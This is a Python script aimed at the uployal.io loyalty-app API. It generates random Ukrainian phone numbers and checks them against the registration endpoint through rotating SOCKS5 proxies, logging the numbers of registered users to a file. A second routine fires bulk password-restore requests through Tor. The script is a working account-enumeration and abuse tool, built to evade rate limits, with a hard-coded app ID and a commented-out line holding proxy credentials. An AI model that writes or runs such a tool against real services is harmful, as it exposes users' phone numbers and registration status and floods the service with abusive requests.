import asyncio
import json
import random
import socket
import ssl
from asyncio import tasks

from aiosocket.async_socket import AIOSocket
from aiosocket.http import read_http_response

operator_codes = [
    "050",  # Kyivstar
    "066",  # Vodafone Ukraine
    "067",  # Vodafone Ukraine
    "068",  # Lifecell
    "095",  # Kyivstar
    "096",  # Kyivstar
    "097",  # Kyivstar
    "098",  # Lifecell
    "099",  # Lifecell
    "063",  # Lifecell
    "093",  # Vodafone Ukraine
    "094",  # Vodafone Ukraine
]


def random_operator():
    return random.choice(operator_codes)


def random_phone_number():
    operator_code = random_operator()
    main_number = f"{random.randint(0, 9999999):07d}"
    formatted_number = (
        f"+38({operator_code}){main_number[:3]}-{main_number[3:5]}-{main_number[5:]}"
    )
    return formatted_number


def craft_request(phone_number):
    data = '{"mobile_phone": "' + phone_number + '",  "send_sms": false}'
    content_len = len(data)
    headers = (
            "Host: uployal.io\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: " + str(content_len) + "\r\n"
                                                    "X-APPLICATION-ID: e81d5b756\r\n"
                                                    "User-Agent: okhttp/4.12.0\r\n"
                                                    "\r\n"
    )
    return (
            "POST /api/mobile/v2.1/consumer/registration/check/ HTTP/1.1\r\n"
            + headers
            + data
    ).encode()


def craft_password_recover(phone_number):
    data = {
        "mobile_phone": phone_number,
    }
    data = json.dumps(data)
    content_len = len(data)
    headers = (
            "Host: uployal.io\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: " + str(content_len) + "\r\n"
                                                    "X-APPLICATION-ID: e81d5b756\r\n"
                                                    "User-Agent: okhttp/4.12.0\r\n"
                                                    "\r\n"
    )
    return (
            "POST /api/mobile/v1/consumer/password-restore/ HTTP/1.1\r\n" + headers + data
    ).encode()


def get_proxies():
    with open('proxies.txt', 'r') as f:
        proxies = f.read().split('\n')
        if '' in proxies:
            proxies.remove('')
        proxies = [proxy.split(':') for proxy in proxies]
        return [(ip, int(port)) for ip, port in proxies]


async def main():
    host = "uployal.io"
    addr = (socket.gethostbyname(host), 443)
    ssl_context = ssl.create_default_context()

    proxies = get_proxies()

    async def phone_check(proxy):
        for _ in range(111111):
            try:
                async_sock = await AIOSocket.open_connection(
                    addr,
                    ssl_context=ssl_context,
                    server_hostname=host,
                    socks5_addr=proxy,
                    # socks5_credentials=("hlzwxekg", "8atteb7xrqzy"),
                )
                for i in range(100):
                    phone = random_phone_number()
                    await async_sock.send(craft_request(phone))
                    res = await read_http_response(async_sock)
                    # print(res)
                    reg = 'is_registered":true' in res.body.decode()
                    if reg:
                        print(phone, res.status_code, reg)
                    if reg:
                        with open("results2.txt", "a") as f:
                            f.write(phone + "\n")
                    await asyncio.sleep(10)
            except Exception as e:
                print("exc", e.__class__)
                pass

    tasks = [asyncio.create_task(phone_check(proxy)) for proxy in proxies]
    await asyncio.gather(*tasks)


async def main2():
    host = "uployal.io"
    addr = (socket.gethostbyname(host), 443)
    ssl_context = ssl.create_default_context()

    async def fuckerr():
        for i in range(100):
            async_sock = await AIOSocket.open_connection(
                addr,
                ssl_context=ssl_context,
                server_hostname=host,
                socks5_addr=('127.0.0.1', 9050),
            )

            for j in range(100):
                phone = random_phone_number()
                await async_sock.send(craft_password_recover(phone))
                res = await read_http_response(async_sock)
                print(i + j, res.body)

    await asyncio.gather(*[fuckerr() for _ in range(1)])


if __name__ == "__main__":
    asyncio.run(main())
